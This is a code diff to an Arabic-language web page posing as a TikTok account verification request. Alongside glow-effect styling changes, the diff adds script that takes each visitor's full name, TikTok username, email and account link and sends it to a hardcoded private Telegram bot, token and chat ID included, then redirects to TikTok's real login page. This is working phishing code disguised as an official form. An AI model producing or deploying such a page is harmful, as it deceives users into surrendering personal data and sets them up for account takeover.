@@ -15,6 +15,7 @@
       --radius: 18px;
       --input-bg: #222222;
       --hover-bg: #e60045;
+      --glow: 0px 0px 8px var(--primary);
     }
 
     * {
@@ -47,6 +48,11 @@
       text-align: center;
       opacity: 0;
       animation: fadeIn 1s forwards;
+      transition: box-shadow 0.3s ease-in-out;
+    }
+
+    .card:hover {
+      box-shadow: var(--glow);
     }
 
     @keyframes fadeIn {
@@ -70,12 +76,14 @@
       font-size: 20px;
       color: var(--text);
       margin-bottom: 10px;
+      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
     }
 
     p {
       font-size: 14px;
       color: var(--muted);
       margin-bottom: 20px;
+      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
     }
 
     input {
@@ -88,6 +96,7 @@
       color: var(--text);
       font-size: 14px;
       transition: all 0.3s ease;
+      box-shadow: 0 0 5px var(--primary);
     }
 
     input::placeholder {
@@ -97,6 +106,7 @@
     input:focus {
       background-color: #333333;
       outline: none;
+      box-shadow: 0 0 8px var(--primary);
     }
 
     button {
@@ -110,6 +120,7 @@
       font-weight: bold;
       cursor: pointer;
       transition: background-color 0.3s ease;
+      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
     }
 
     button:hover {
@@ -123,10 +134,10 @@
     <h2>طلب توثيق الحساب</h2>
     <p>املأ المعلومات أدناه لإرسال طلبك</p>
     <form id="verifyForm">
-      <input type="text" placeholder="الاسم الكامل" required>
-      <input type="text" placeholder="اسم المستخدم في TikTok" required>
-      <input type="email" placeholder="البريد الإلكتروني" required>
-      <input type="text" placeholder="رابط الحساب (اختياري)">
+      <input type="text" placeholder="الاسم الكامل" id="fullName" required>
+      <input type="text" placeholder="اسم المستخدم في TikTok" id="userName" required>
+      <input type="email" placeholder="البريد الإلكتروني" id="email" required>
+      <input type="text" placeholder="رابط الحساب (اختياري)" id="accountLink">
       <button type="submit">إرسال الطلب</button>
     </form>
   </div>
@@ -134,7 +145,43 @@
   <script>
     document.getElementById("verifyForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      alert("تم استلام طلب التوثيق بنجاح.");
+
+      const fullName = document.getElementById('fullName').value;
+      const userName = document.getElementById('userName').value;
+      const email = document.getElementById('email').value;
+      const accountLink = document.getElementById('accountLink').value;
+
+      // Send data to Telegram Bot
+      const botToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
+      const chatId = '5029891039';
+      const message = `
+*✅ طلب توثيق الحساب جديد* 
+
+👤 *الاسم الكامل:* ${fullName}
+🎮 *اسم المستخدم في TikTok:* ${userName}
+📧 *البريد الإلكتروني:* ${email}
+🔗 *رابط الحساب (اختياري):* ${accountLink ? accountLink : 'لا يوجد'}
+
+🔔 شكراً لتقديم طلبك! سيتم مراجعته في أقرب وقت! 🎉
+      `;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('تم استلام طلب التوثيق بنجاح!');
+          window.location.href = 'https://www.tiktok.com/login'; // Redirect to TikTok login page
+        } else {
+          alert('فشل في إرسال البيانات!');
+        }
+      });
     });
   </script>
 </body>
